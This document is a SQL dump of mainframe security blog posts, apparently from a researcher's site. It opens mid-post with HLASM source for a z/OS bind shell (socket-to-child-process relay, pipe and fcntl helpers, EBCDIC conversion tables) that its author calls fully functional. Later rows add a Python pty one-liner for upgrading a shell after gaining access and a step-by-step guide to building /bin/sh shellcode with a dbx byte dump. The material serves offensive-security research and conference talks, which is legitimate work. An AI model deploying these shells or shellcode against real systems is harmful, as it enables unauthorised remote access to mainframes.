15,LWRITE       # call write function***********************************************************************@READCFD L     5,CFDR          # read from child fd         LA    7,@READCLI      # nothing read, back to socket read         LARL  14,@E2A1        # Bytes read, return to here         BRC   15,LREAD        # Branch to read function***********************************************************************@E2A1    LARL  14,@CCW2        # load return area in r14         BRC   15,CONVEA       # call e2a func@CCW2    LARL  14,@READCFD     # loop read child proc fd after write         L     5,CLIFD         # write to client socked fd         BRC   15,LWRITE       # call write function\r\n					\r\n				\r\n			\r\n		\r\n\r\n\n\nThese are the common functions called by the segments above: READ,WRITE,FCNTL,PIPE.   Notations are made in the full source code about any inputs / outputs to these functions.\n\n\r\n\r\n		\r\n		\r\n			Common Functions: READ,WRITE,FCNTL,PIPE\r\n			Assembly (x86)\r\n			\r\n			\n***********************************************************************\r\nLREAD    L     15,BRED         # load func addr to 15\r\n         ST    5,@TRFD         # file descriptor we are reading\r\n         ST    7,@NRA          # no bytes read: return address\r\n         ST    14,SAVEAREA     # bytes read: return address\r\n         XR    1,1             # clear R1\r\n         ST    1,BREAD         # clear Bytes Read\r\n         L     5,CLIBUF        # clibuf addr\r\n         XC    0(52,5),0(5)    # 0 out cli buf\r\n         BRAS  0,@CRED         # jump to call\r\n@TRFD    DC    4XL1\'0\'         # temp var for rd to read\r\n@NRA     DC    4XL1\'0\'         # temp var for not read ret addr\r\n@CRED    CALL  (15),(@TRFD,CLIBUF,ALET,CLIREAD,                        x\r\n               BREAD,RTN_COD,RSN_COD),VL\r\n         L     14,SAVEAREA     # bytes read RA\r\n         L     7,@NRA          # no bytes read RA\r\n         LHI   15,6            # exit code for this function\r\n         L     6,BREAD         # bytes read (aka rtn val)\r\n         CIB   6,0,2,0(14)     # bytes read, process them\r\n         CIB   6,0,8,0(7)      # OK rtn code, on to nobyte read\r\n         L     6,RTN_COD       # load up return code\r\n         LA    1,EWOULDBLOCK   # load up the non-blocking RTNCOD\r\n         LA    2,EAGAIN        # load up the other OK nblck RTNCOD\r\n         CRB   6,1,8,0(7)      # OK rtn code, on to nobyte read\r\n         CRB   6,2,8,0(7)      # OK rtn code, on to nobyte read\r\n         BRAS  0,EXITP         # -1 and not due to blocking, exit\r\n***********************************************************************\r\nLWRITE   L     15,BWRT          # load func addr to 15\r\n         ST    5,@TWFD          # store fd in temp fd\r\n         ST    14,SAVEAREA      # save return address\r\n         BRAS  0,@CWRT          # jump to write\r\n@TWFD    DC    A(*)             # temp holder for fd\r\n@CWRT    CALL  (15),(@TWFD,CLIBUF,ALET,BREAD,                          x\r\n               BWRIT,RTN_COD,RSN_COD),VL\r\n         L     14,SAVEAREA      # restore return address\r\n         LHI   15,9             # exit code for this func\r\n         L     6,BWRIT          # set r6 to rtn val\r\n         CIB   6,-1,8,EXITP     # exit if R6 = -1\r\n         BCR   15,14            # back to return address\r\n***********************************************************************\r\nLFCNTL   L     15,BFCT         # load func addr to 15\r\n         ST    14,SAVEAREA     # save return address\r\n         ST    5,@FFD          # fd to be duplicated\r\n         ST    2,@ACT          # action field for BPX1FCT\r\n         ST    6,@ARG          # r6 should have the biggest fd\r\n         BRAS  0,@FCTL\r\n@FFD     DC    F\'0\'\r\n@ACT     DC    F\'0\'\r\n@ARG     DC    F\'0\'\r\n@RETFD   DC    F\'0\'\r\n@FCTL    CALL  (15),(@FFD,@ACT,@ARG,@RETFD,RTN_COD,RSN_COD),VL\r\n         LHI   15,11           # exit code for this func\r\n         L     7,@RETFD        # set r7 to rtn val\r\n         CIB   7,-1,8,EXITP    # r6 = -1 exit\r\n         L     14,SAVEAREA     # reload ret address\r\n         BCR   15,14           # return to caller\r\n***********************************************************************\r\nLPIPE    L     15,BPIP         # load func addr to 15\r\n         ST    14,SAVEAREA     # save return address\r\n         BRAS  0,@PIP\r\n@RFD     DC    F\'0\'            # read file desc\r\n@WFD     DC    F\'0\'            # write file desc\r\n@PIP     CALL  (15),(@RFD,@WFD,RTN_VAL,RTN_COD,RSN_COD),VL\r\n         LHI   15,12           # exit code for this func\r\n         L     6,BWRIT         # set r6 to rtn val\r\n         CIB   6,-1,8,EXITP\r\n         L     5,@RFD          # load R5 with read fd\r\n         L     6,@WFD          # load R6 with write fd\r\n         L     14,SAVEAREA     # reload ret address\r\n         BCR   15,14           # return to caller\r\n			\r\n				\r\n					\r\n				\r\n					12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970\r\n				\r\n						***********************************************************************LREAD    L     15,BRED         # load func addr to 15         ST    5,@TRFD         # file descriptor we are reading         ST    7,@NRA          # no bytes read: return address         ST    14,SAVEAREA     # bytes read: return address         XR    1,1             # clear R1         ST    1,BREAD         # clear Bytes Read         L     5,CLIBUF        # clibuf addr         XC    0(52,5),0(5)    # 0 out cli buf         BRAS  0,@CRED         # jump to call@TRFD    DC    4XL1\'0\'         # temp var for rd to read@NRA     DC    4XL1\'0\'         # temp var for not read ret addr@CRED    CALL  (15),(@TRFD,CLIBUF,ALET,CLIREAD,                        x               BREAD,RTN_COD,RSN_COD),VL         L     14,SAVEAREA     # bytes read RA         L     7,@NRA          # no bytes read RA         LHI   15,6            # exit code for this function         L     6,BREAD         # bytes read (aka rtn val)         CIB   6,0,2,0(14)     # bytes read, process them         CIB   6,0,8,0(7)      # OK rtn code, on to nobyte read         L     6,RTN_COD       # load up return code         LA    1,EWOULDBLOCK   # load up the non-blocking RTNCOD         LA    2,EAGAIN        # load up the other OK nblck RTNCOD         CRB   6,1,8,0(7)      # OK rtn code, on to nobyte read         CRB   6,2,8,0(7)      # OK rtn code, on to nobyte read         BRAS  0,EXITP         # -1 and not due to blocking, exit***********************************************************************LWRITE   L     15,BWRT          # load func addr to 15         ST    5,@TWFD          # store fd in temp fd         ST    14,SAVEAREA      # save return address         BRAS  0,@CWRT          # jump to write@TWFD    DC    A(*)             # temp holder for fd@CWRT    CALL  (15),(@TWFD,CLIBUF,ALET,BREAD,                          x               BWRIT,RTN_COD,RSN_COD),VL         L     14,SAVEAREA      # restore return address         LHI   15,9             # exit code for this func         L     6,BWRIT          # set r6 to rtn val         CIB   6,-1,8,EXITP     # exit if R6 = -1         BCR   15,14            # back to return address***********************************************************************LFCNTL   L     15,BFCT         # load func addr to 15         ST    14,SAVEAREA     # save return address         ST    5,@FFD          # fd to be duplicated         ST    2,@ACT          # action field for BPX1FCT         ST    6,@ARG          # r6 should have the biggest fd         BRAS  0,@FCTL@FFD     DC    F\'0\'@ACT     DC    F\'0\'@ARG     DC    F\'0\'@RETFD   DC    F\'0\'@FCTL    CALL  (15),(@FFD,@ACT,@ARG,@RETFD,RTN_COD,RSN_COD),VL         LHI   15,11           # exit code for this func         L     7,@RETFD        # set r7 to rtn val         CIB   7,-1,8,EXITP    # r6 = -1 exit         L     14,SAVEAREA     # reload ret address         BCR   15,14           # return to caller***********************************************************************LPIPE    L     15,BPIP         # load func addr to 15         ST    14,SAVEAREA     # save return address         BRAS  0,@PIP@RFD     DC    F\'0\'            # read file desc@WFD     DC    F\'0\'            # write file desc@PIP     CALL  (15),(@RFD,@WFD,RTN_VAL,RTN_COD,RSN_COD),VL         LHI   15,12           # exit code for this func         L     6,BWRIT         # set r6 to rtn val         CIB   6,-1,8,EXITP         L     5,@RFD          # load R5 with read fd         L     6,@WFD          # load R6 with write fd         L     14,SAVEAREA     # reload ret address         BCR   15,14           # return to caller\r\n					\r\n				\r\n			\r\n		\r\n\r\n\n\nThese two functions are customized ASCII to EBCDIC and vice versa.   They very simply use 2 lookup tables of 255 bytes each.   The E2A table are ASCII bytes ordered by EBCDIC index, the reverse for the other.   So to change the ASCII byte \\x41 to EBCDIC \\xc1, for instance, you’d look up the \\x41st element in the A2E table and read the corresponding byte (\\xc1).   The opposite table for the reverse conversion.\n\n\r\n\r\n		\r\n		\r\n			Custom functions A2E/E2A\r\n			Assembly (x86)\r\n			\r\n			\nCONVAE   LHI   6,1        # R6 has number 1\r\n         L     4,BREAD    # num of bytes read\r\n         L     1,CLIBUF   # address of cli sock input\r\nLOOP1    L     2,A2E      # address of a2e buff\r\n         SR    2,6        # subtract 1 from R2 addr\r\n         LB    3,0(0,1)   # Load byte from cli into R3\r\n         NILF  3,X\'FF\'    # make sure R3 is 1 positive byte\r\n         AR    2,3        # add ascii val to a2e buff\r\n         LB    3,0(0,2)   # load byte from a2e buff into R3\r\n         NILF  3,X\'FF\'    # make sure R3 is 1 positive byte\r\n         STC   3,0(0,1)   # store R3 byte back into cli buff\r\n         AR    1,6        # increment client buff\r\n         SR    4,6        # sub1 from ctr, loop if non-neg\r\n         BRC   7,LOOP1    # looop\r\n         BCR   15,14      # return to caller\r\n***********************************************************************\r\nCONVEA   LHI   6,1        # R6 has number 1\r\n         L     4,BREAD    # num of bytes read\r\n         L     1,CLIBUF   # address of cli sock input\r\nLOOP2    L     2,E2A      # address of e2a buff\r\n         SR    2,6        # subtract 1 from R2 addr\r\n         LB    3,0(0,1)   # Load byte from cli into R3\r\n         NILF  3,X\'FF\'    # make sure R3 is 1 positive byte\r\n         AR    2,3        # add ascii val to e2a buff\r\n         LB    3,0(0,2)   # load byte from e2a buff into R3\r\n         STC   3,0(0,1)   # store R3 byte back into cli buff\r\n         NILF  3,X\'FF\'    # make sure R3 is 1 positive byte\r\n         AR    1,6        # increment client buff\r\n         SR    4,6        # sub1 from ctr, loop if non-neg\r\n         BRC   7,LOOP2    # looop\r\n         BCR   15,14      # return to caller\r\n***********************************************************************\r\nE2ABUF   DC    X\'0102039c09867f978d8e0b0c0d0e0f101112139d0a08871819928fX\r\n               1c1d1e1f808182838485171b88898a8b8c0506079091169394959604X\r\n               98999a9b14159e1a20a0e2e4e0e1e3e5e7f1a22e3c282b7c26e9eaebX\r\n               e8edeeefecdf21242a293b5e2d2fc2c4c0c1c3c5c7d1a62c255f3e3fX\r\n               f8c9cacbc8cdcecfcc603a2340273d22\'\r\n         DC    X\'d8616263646566676869abbbf0fdfeb1b06a6b6c6d6e6f707172aaX\r\n               bae6b8c6a4b57e737475767778797aa1bfd05bdeaeaca3a5b7a9a7b6X\r\n               bcbdbedda8af5db4d77b414243444546474849adf4f6f2f3f57d4a4bX\r\n               4c4d4e4f505152b9fbfcf9faff5cf7535455565758595ab2d4d6d2d3X\r\n               d530313233343536373839b3dbdcd9da\'\r\n         DC    X\'9f\'\r\nE2A      DC    A(E2ABUF)\r\n***********************************************************************\r\nA2EBUF   DC    X\'010203372d2e2f1605150b0c0d0e0f101112133c3d322618193f27X\r\n               1c1d1e1f405a7f7b5b6c507d4d5d5c4e6b604b61f0f1f2f3f4f5f6f7X\r\n               f8f97a5e4c7e6e6f7cc1c2c3c4c5c6c7c8c9d1d2d3d4d5d6d7d8d9e2X\r\n               e3e4e5e6e7e8e9ade0bd5f6d79818283848586878889919293949596X\r\n               979899a2a3a4a5a6a7a8a9c04fd0a107\'\r\n         DC    X\'202122232425061728292a2b2c090a1b30311a333435360838393aX\r\n               3b04143eff41aa4ab19fb26ab5bbb49a8ab0caafbc908feafabea0b6X\r\n               b39dda9b8bb7b8b9ab6465626663679e687471727378757677ac69edX\r\n               eeebefecbf80fdfefbfcbaae594445424643479c4854515253585556X\r\n               578c49cdcecbcfcce170dddedbdc8d8e\'\r\n         DC    X\'df\'\r\nA2E      DC    A(A2EBUF)\r\n			\r\n				\r\n					\r\n				\r\n					123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657\r\n				\r\n						CONVAE   LHI   6,1        # R6 has number 1         L     4,BREAD    # num of bytes read         L     1,CLIBUF   # address of cli sock inputLOOP1    L     2,A2E      # address of a2e buff         SR    2,6        # subtract 1 from R2 addr         LB    3,0(0,1)   # Load byte from cli into R3         NILF  3,X\'FF\'    # make sure R3 is 1 positive byte         AR    2,3        # add ascii val to a2e buff         LB    3,0(0,2)   # load byte from a2e buff into R3         NILF  3,X\'FF\'    # make sure R3 is 1 positive byte         STC   3,0(0,1)   # store R3 byte back into cli buff         AR    1,6        # increment client buff         SR    4,6        # sub1 from ctr, loop if non-neg         BRC   7,LOOP1    # looop         BCR   15,14      # return to caller***********************************************************************CONVEA   LHI   6,1        # R6 has number 1         L     4,BREAD    # num of bytes read         L     1,CLIBUF   # address of cli sock inputLOOP2    L     2,E2A      # address of e2a buff         SR    2,6        # subtract 1 from R2 addr         LB    3,0(0,1)   # Load byte from cli into R3         NILF  3,X\'FF\'    # make sure R3 is 1 positive byte         AR    2,3        # add ascii val to e2a buff         LB    3,0(0,2)   # load byte from e2a buff into R3         STC   3,0(0,1)   # store R3 byte back into cli buff         NILF  3,X\'FF\'    # make sure R3 is 1 positive byte         AR    1,6        # increment client buff         SR    4,6        # sub1 from ctr, loop if non-neg         BRC   7,LOOP2    # looop         BCR   15,14      # return to caller***********************************************************************E2ABUF   DC    X\'0102039c09867f978d8e0b0c0d0e0f101112139d0a08871819928fX               1c1d1e1f808182838485171b88898a8b8c0506079091169394959604X               98999a9b14159e1a20a0e2e4e0e1e3e5e7f1a22e3c282b7c26e9eaebX               e8edeeefecdf21242a293b5e2d2fc2c4c0c1c3c5c7d1a62c255f3e3fX               f8c9cacbc8cdcecfcc603a2340273d22\'         DC    X\'d8616263646566676869abbbf0fdfeb1b06a6b6c6d6e6f707172aaX               bae6b8c6a4b57e737475767778797aa1bfd05bdeaeaca3a5b7a9a7b6X               bcbdbedda8af5db4d77b414243444546474849adf4f6f2f3f57d4a4bX               4c4d4e4f505152b9fbfcf9faff5cf7535455565758595ab2d4d6d2d3X               d530313233343536373839b3dbdcd9da\'         DC    X\'9f\'E2A      DC    A(E2ABUF)***********************************************************************A2EBUF   DC    X\'010203372d2e2f1605150b0c0d0e0f101112133c3d322618193f27X               1c1d1e1f405a7f7b5b6c507d4d5d5c4e6b604b61f0f1f2f3f4f5f6f7X               f8f97a5e4c7e6e6f7cc1c2c3c4c5c6c7c8c9d1d2d3d4d5d6d7d8d9e2X               e3e4e5e6e7e8e9ade0bd5f6d79818283848586878889919293949596X               979899a2a3a4a5a6a7a8a9c04fd0a107\'         DC    X\'202122232425061728292a2b2c090a1b30311a333435360838393aX               3b04143eff41aa4ab19fb26ab5bbb49a8ab0caafbc908feafabea0b6X               b39dda9b8bb7b8b9ab6465626663679e687471727378757677ac69edX               eeebefecbf80fdfefbfcbaae594445424643479c4854515253585556X               578c49cdcecbcfcce170dddedbdc8d8e\'         DC    X\'df\'A2E      DC    A(A2EBUF)\r\n					\r\n				\r\n			\r\n		\r\n\r\n\n\nThis just cleans up and restores registers that were saved in step 1.\n\n\r\n\r\n		\r\n		\r\n			Cleanup and exit\r\n			Assembly (x86)\r\n			\r\n			\nGOODEX   XR    15,15           # zero return code\r\nEXITP    ST    15,0(,11)\r\n         L     13,4(,11)\r\n         LM    14,12,12(13)    # restore registers\r\n         LARL  5,SAVEAREA\r\n         L     15,0(0,5)\r\n         BCR   15,14           # branch to caller\r\n			\r\n				\r\n					\r\n				\r\n					1234567\r\n				\r\n						GOODEX   XR    15,15           # zero return codeEXITP    ST    15,0(,11)         L     13,4(,11)         LM    14,12,12(13)    # restore registers         LARL  5,SAVEAREA         L     15,0(0,5)         BCR   15,14           # branch to caller\r\n					\r\n				\r\n			\r\n		\r\n\r\nThe full source has more notations, all the constants, error checking and handling, etc.    This code is my first go at this, it’s fully functional – but certainly it has some room for optimization and improvement.\nIf this interests you, come see my talk at this year’s Derbycon 5.0 Saturday at 5:30pm!\nLink to the full source on zedsec390 github.', 'Exploit Development, Mainframe, Security', 'https://www.bigendiansmalls.com/mainframe-bind-shell-source-code/\n');
INSERT INTO `MainFrameSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (38, 'Python shells on Z & a Patch to Ported Tools', 'bigendiansmalls', '2015-08-21T14:16:49+00:00', 'Rocket Software (@rocket on twitter, links below) has a great set of ported tools for System Z.  One of them is Python 2.7.6    Python is in ever penetration tester’s toolkit, and one of my favorite uses for it is to get a “clean” shell once you have gotten connectivity to a system.\nMainframe is no different;  using the old one liner\r\n\r\n		\r\n		\r\n			\r\n			\r\n			\r\n			\npython -c \"import pty;pty.spawn(\'/bin/sh\')\"\r\n			\r\n				\r\n					\r\n				\r\n					1\r\n				\r\n						python -c \"import pty;pty.spawn(\'/bin/sh\')\"\r\n					\r\n				\r\n			\r\n		\r\n\r\nOne can change an ugly shell (perhaps gained by Java app, or some other means:  e.g. netcat, exploit, etc) into one with proper TTY / shell settings, as show in this simple gif:\n\nThe Gist below patches Rocket’s port of Python to make this work on System Z ( the pty.py – one line fix to match the naming conventions on mainframe).\nGist for patching python\nRocket Ported tools @ SHARE\nRocket Ported Tools Download', 'Uncategorized', 'https://www.bigendiansmalls.com/python-shells-on-z-a-patch-to-ported-tools/\n');
INSERT INTO `MainFrameSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (39, 'Hak5 DEF CON 23 Interview', 'bigendiansmalls', '2015-08-21T08:36:20+00:00', '', 'Uncategorized', 'https://www.bigendiansmalls.com/hak5-def-con-23-interview/\n');
INSERT INTO `MainFrameSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (40, 'Metasploit-framework  version Z??', 'bigendiansmalls', '2015-08-19T09:52:04+00:00', 'When worlds collide …', 'Uncategorized', 'https://www.bigendiansmalls.com/metasploit-framework-version-z/\n');
INSERT INTO `MainFrameSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (41, 'DEF CON 23 – Slides & Code', 'bigendiansmalls', '2015-08-12T13:30:37+00:00', 'If you are interested (and why wouldn’t you be?)   Here are is a link to the presentation posted below, given by myself and Soldier of Fortran (@mainframed767) at this year’s DEF CON23.   Enjoy!\nThe link to all the tools and code in the presentation can be found here.\n \n\n \n Security necromancy – Further adventures in mainframe hacking – DEF CON 23 \nfrom\nbigendiansmalls and Soldier of Fortran', 'Uncategorized', 'https://www.bigendiansmalls.com/def-con-23-slides-code/\n');
INSERT INTO `MainFrameSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (42, 'DEF CON 23 Tools', 'bigendiansmalls', '2015-08-08T19:11:10+00:00', 'Here are links to the git repositories for code used during my DEF CON talk.\nDEF CON 23 code', 'Uncategorized', 'https://www.bigendiansmalls.com/def-con-23-tools/\n');
INSERT INTO `MainFrameSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (43, 'Building shellcode, egghunters and decoders.', 'bigendiansmalls', '2015-07-23T08:01:11+00:00', 'Creating shellcode on System Z (Mainframe)  Unix System Services (USS) employs the same disciplines required for the same activities on Intel platforms.   The difference lies in the syntax, assembler mnemonics, tools available, and debugging utilities.  There are certainly other ways to achieve this, and I’m still refining my favorites.  The below is one of my early successful attempts at doing so.\nIf you have never created shellcode from scratch, including a hand-hewn encoder for zapping bad characters, I recommend you do so on a well-documented platform.   Become familiar with using basic (but powerful tools for the task) such as dd, od, gdb and basic python scripting.\n\nThe process I followed developing shellcode for mainframe USS uses pretty common tried and true processes, using only basic tools available on the platform.   At a high level, it looks like this:\n1)  Develop a working payload.   Here, for example is a simple C program that launches a shell.  Note, this program uses hard-coded strings, lengths, and pointers.  This is done to make the resulting assembler as simple as possible.  See previous posts on how to find the callable services, making this possible.\n\r\n\r\n		\r\n		\r\n			\r\n			\r\n			\r\n			\n<span style=\"color: #808080;\">#include &lt;string.h&gt;</span>\r\n<span style=\"color: #808080;\">typedef void nullf();</span>\r\n\r\n<span style=\"color: #808080;\">int main(){\r\n        unsigned int zeroint = 0;</span>\r\n<span style=\"color: #808080;\">        unsigned int sevenint = 7;</span>\r\n<span style=\"color: #808080;\">        unsigned char *zerochr = (unsigned char *)&amp;zeroint;</span>\r\n<span style=\"color: #808080;\">        void (*Exit_routine_address)()=0;</span>\r\n\r\n<span style=\"color: #808080;\">        unsigned char *addr = 0;</span>\r\n<span style=\"color: #808080;\">        memcpy(&amp;(addr),(addr)+16,4);</span>\r\n<span style=\"color: #808080;\">        memcpy(&amp;(addr),(addr)+544,4);</span>\r\n<span style=\"color: #808080;\">        memcpy(&amp;(addr),(addr)+24,4);</span>\r\n<span style=\"color: #808080;\">        memcpy(&amp;(addr),(addr)+228,4);</span>\r\n\r\n<span style=\"color: #808080;\">        ((nullf *)addr)(</span>\r\n<span style=\"color: #808080;\">              &amp;sevenint,</span>\r\n<span style=\"color: #808080;\">              \"/bin/sh\",</span>\r\n<span style=\"color: #808080;\">              &amp;zeroint,</span>\r\n<span style=\"color: #808080;\">              *zerochr,</span>\r\n<span style=\"color: #808080;\">              *zerochr,</span>\r\n<span style=\"color: #808080;\">              &amp;zeroint,</span>\r\n<span style=\"color: #808080;\">              *zerochr,</span>\r\n<span style=\"color: #808080;\">              *zerochr,</span>\r\n<span style=\"color: #808080;\">              &amp;zeroint,</span>\r\n<span style=\"color: #808080;\">              *zerochr,</span>\r\n<span style=\"color: #808080;\">              &amp;zeroint,</span>\r\n<span style=\"color: #808080;\">              &amp;zeroint,</span>\r\n<span style=\"color: #808080;\">              &amp;zeroint);</span>\r\n<span style=\"color: #808080;\">        return 0;</span>\r\n<span style=\"color: #808080;\">}</span>\r\n			\r\n				\r\n					\r\n				\r\n					12345678910111213141516171819202122232425262728293031\r\n				\r\n						<span style=\"color: #808080;\">#include &lt;string.h&gt;</span><span style=\"color: #808080;\">typedef void nullf();</span> <span style=\"color: #808080;\">int main(){        unsigned int zeroint = 0;</span><span style=\"color: #808080;\">        unsigned int sevenint = 7;</span><span style=\"color: #808080;\">        unsigned char *zerochr = (unsigned char *)&amp;zeroint;</span><span style=\"color: #808080;\">        void (*Exit_routine_address)()=0;</span> <span style=\"color: #808080;\">        unsigned char *addr = 0;</span><span style=\"color: #808080;\">        memcpy(&amp;(addr),(addr)+16,4);</span><span style=\"color: #808080;\">        memcpy(&amp;(addr),(addr)+544,4);</span><span style=\"color: #808080;\">        memcpy(&amp;(addr),(addr)+24,4);</span><span style=\"color: #808080;\">        memcpy(&amp;(addr),(addr)+228,4);</span> <span style=\"color: #808080;\">        ((nullf *)addr)(</span><span style=\"color: #808080;\">              &amp;sevenint,</span><span style=\"color: #808080;\">              \"/bin/sh\",</span><span style=\"color: #808080;\">              &amp;zeroint,</span><span style=\"color: #808080;\">              *zerochr,</span><span style=\"color: #808080;\">              *zerochr,</span><span style=\"color: #808080;\">              &amp;zeroint,</span><span style=\"color: #808080;\">              *zerochr,</span><span style=\"color: #808080;\">              *zerochr,</span><span style=\"color: #808080;\">              &amp;zeroint,</span><span style=\"color: #808080;\">              *zerochr,</span><span style=\"color: #808080;\">              &amp;zeroint,</span><span style=\"color: #808080;\">              &amp;zeroint,</span><span style=\"color: #808080;\">              &amp;zeroint);</span><span style=\"color: #808080;\">        return 0;</span><span style=\"color: #808080;\">}</span>\r\n					\r\n				\r\n			\r\n		\r\n\r\n\n2) Use a C compiler that generates assembler (if you aren’t writing in HLASM to begin with) to help decide which bytes are relevant.  IBM’s metal compiler xlc used with the following options works nicely.  Note, the assembly generated here is IBM’s HLASM (High Level assembly), It is still 1 degree removed from the actual machine-language mnemonics they use to generate the 1’s and 0’s.   To get this, you have to use the debugger dbx.\n\r\n\r\n		\r\n		\r\n			\r\n			\r\n			\r\n			\n<span style=\"color: #808080;\">xlc -S -qmetal pgm.c</span>\r\n			\r\n				\r\n					\r\n				\r\n					1\r\n				\r\n						<span style=\"color: #808080;\">xlc -S -qmetal pgm.c</span>\r\n					\r\n				\r\n			\r\n		\r\n\r\n\n3)  The primary debugger I’m using, dbx, can easily save memory dumps to a file.  These can be formatted to create simple shellcode.  Example:\n\r\n\r\n		\r\n		\r\n			\r\n			\r\n			\r\n			\n<span style=\"color: #808080;\">0x1f175e90 (???)       90ebd00c     STM     R14,R11,12(R13)\r\n0x1f175e94 (???)       c0f0fffffffe LARL    R15,*-4\r\n0x1f175e9a (???)       5800f028     L       R0,40(,R15)\r\n0x1f175e9e (???)       58f0f02c     L       R15,44(,R15)\r\n0x1f175ea2 (???)       58e00010     L       R14,16\r\n0x1f175ea6 (???)       58ee0304     L       R14,772(R14)\r\n0x1f175eaa (???)       58ee00a0     L       R14,160(R14)\r\n0x1f175eb2 (???)       a7f40007     BRC     15,*+14\r\n...\r\n0x1f175ec0 (???)       18fd         LR      R15,R13\r\n0x1f175ec2 (???)       18d1         LR      R13,R1\r\n0x1f175ec4 (???)       50f0d004     ST      R15,4(,R13)\r\n0x1f175ec8 (???)       50d0f008     ST      R13,8(,R15)\r\n0x1f175ecc (???)       5810f018     L       R1,24(,R15)\r\n0x1f175ed0 (???)       41a000d8     LA      R10,216\r\n0x1f175ed4 (???)       1ead         ALR     R10,R13\r\n0x1f175ed6 (???)       50a0d048     ST      R10,72(,R13)\r\n0x1f175eda (???)       c03000000077 LARL    R3,*+238\r\n0x1f175ee0 (???)       ebebd0940026 STMH    R14,R11,148(R13)\r\n0x1f175ee6 (???)       c0b000000075 LARL    R11,*+234\r\n0x1f175eec (???)       41200000     LA      R2,0\r\n0x1f175ef0 (???)       5020d080     ST      R2,128(,R13)\r\n0x1f175ef4 (???)       41e00007     LA      R14,7\r\n0x1f175ef8 (???)       50e0d084     ST      R14,132(,R13)\r\n0x1f175efc (???)       41e0d080     LA      R14,128(,R13)\r\n.......\r\n0x1f175f00 (???)       50e0d088     ST      R14,136(,R13)\r\n0x1f175f04 (???)       18e2         LR      R14,R2\r\n0x1f175f06 (???)       50e0d090     ST      R14,144(,R13)\r\n0x1f175f0a (???)       d203d090e010 MVC     144(4,R13),16(R14)\r\n0x1f175f10 (???)       58e0d090     L       R14,144(,R13)\r\n0x1f175f14 (???)       d203d090e220 MVC     144(4,R13),544(R14)\r\n0x1f175f1a (???)       58e0d090     L       R14,144(,R13)\r\n0x1f175f1e (???)       d203d090e018 MVC     144(4,R13),24(R14)\r\n0x1f175f24 (???)       58e0d090     L       R14,144(,R13)\r\n0x1f175f28 (???)       d203d090e0e4 MVC     144(4,R13),228(R14)\r\n0x1f175f2e (???)       58e0d088     L       R14,136(,R13)\r\n......\r\n(dbx64) 0x1f175e90/0xf4h\r\n1f175e90:  90 eb d0 0c c0 f0 ff ff ff fe 58 00 f0 28 58 f0\r\n1f175ea0:  f0 2c 58 e0 00 10 58 ee 03 04 58 ee 00 a0 b2 18\r\n1f175eb0:  e0 00 a7 f4 00 07 00 00 00 10 00 d8 00 00 00 06\r\n1f175ec0:  18 fd 18 d1 50 f0 d0 04 50 d0 f0 08 58 10 f0 18\r\n1f175ed0:  41 a0 00 d8 1e ad 50 a0 d0 48 c0 30 00 00 00 77\r\n1f175ee0:  eb eb d0 94 00 26 c0 b0 00 00 00 75 41 20 00 00\r\n1f175ef0:  50 20 d0 80 41 e0 00 07 50 e0 d0 84 41 e0 d0 80\r\n1f175f00:  50 e0 d0 88 18 e2 50 e0 d0 90 d2 03 d0 90 e0 10\r\n1f175f10:  58 e0 d0 90 d2 03 d0 90 e2 20 58 e0 d0 90 d2 03\r\n1f175f20:  d0 90 e0 18 58 e0 d0 90 d2 03 d0 90 e0 e4 58 e0\r\n1f175f30:  d0 88 1f 00 43 00 e0 00 58 f0 d0 90 41 e0 d0 80\r\n1f175f40:  41 40 d0 84 41 10 d0 4c 50 40 d0 4c 18 4b 50 40\r\n1f175f50:  d0 50 50 e0 d0 54 50 00 d0 58 50 00 d0 5c 50 e0\r\n1f175f60:  d0 60 50 00 d0 64 50 00 d0 68 50 e0 d0 6c 50 00\r\n1f175f70:  d0 70 50 e0 d0 74 50 e0 d0 78 50 e0 d0 7c d2 03\r\n1f175f80:  d0 08 d0 48\r\n(dbx64) 0x1f175e90/0xf4h &gt; tmp.buf\r\n</span>\r\n			\r\n				\r\n					\r\n				\r\n					123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657\r\n				\r\n						<span style=\"color: #808080;\">0x1f175e90 (???)       90ebd00c     STM     R14,R11,12(R13)0x1f175e94 (???)       c0f0fffffffe LARL    R15,*-40x1f175e9a (???)       5800f028     L       R0,40(,R15)0x1f175e9e (???)       58f0f02c     L       R15,44(,R15)0x1f175ea2 (???)       58e00010     L       R14,160x1f175ea6 (???)       58ee0304     L       R14,772(R14)0x1f175eaa (???)       58ee00a0     L       R14,160(R14)0x1f175eb2 (???)       a7f40007     BRC     15,*+14...0x1f175ec0 (???)       18fd         LR      R15,R130x1f175ec2 (???)       18d1         LR      R13,R10x1f175ec4 (???)       50f0d004     ST      R15,4(,R13)0x1f175ec8 (???)       50d0f008     ST      R13,8(,R15)0x1f175ecc (???)       5810f018     L       R1,24(,R15)0x1f175ed0 (???)       41a000d8     LA      R10,2160x1f175ed4 (???)       1ead         ALR     R10,R130x1f175ed6 (???)       50a0d048     ST      R10,72(,R13)0x1f175eda (???)       c03000000077 LARL    R3,*+2380x1f175ee0 (???)       ebebd0940026 STMH    R14,R11,148(R13)0x1f175ee6 (???)       c0b000000075 LARL    R11,*+2340x1f175eec (???)       41200000     LA      R2,00x1f175ef0 (???)       5020d080     ST      R2,128(,R13)0x1f175ef4 (???)       41e00007     LA      R14,70x1f175ef8 (???)       50e0d084     ST      R14,132(,R13)0x1f175efc (???)       41e0d080     LA      R14,128(,R13).......0x1f175f00 (???)       50e0d088     ST      R14,136(,R13)0x1f175f04 (???)       18e2         LR      R14,R20x1f175f06 (???)       50e0d090     ST      R14,144(,R13)0x1f175f0a (???)       d203d090e010 MVC     144(4,R13),16(R14)0x1f175f10 (???)       58e0d090     L       R14,144(,R13)0x1f175f14 (???)       d203d090e220 MVC     144(4,R13),544(R14)0x1f175f1a (???)       58e0d090     L       R14,144(,R13)0x1f175f1e (???)       d203d090e018 MVC     144(4,R13),24(R14)0x1f175f24 (???)       58e0d090     L       R14,144(,R13)0x1f175f28 (???)       d203d090e0e4 MVC     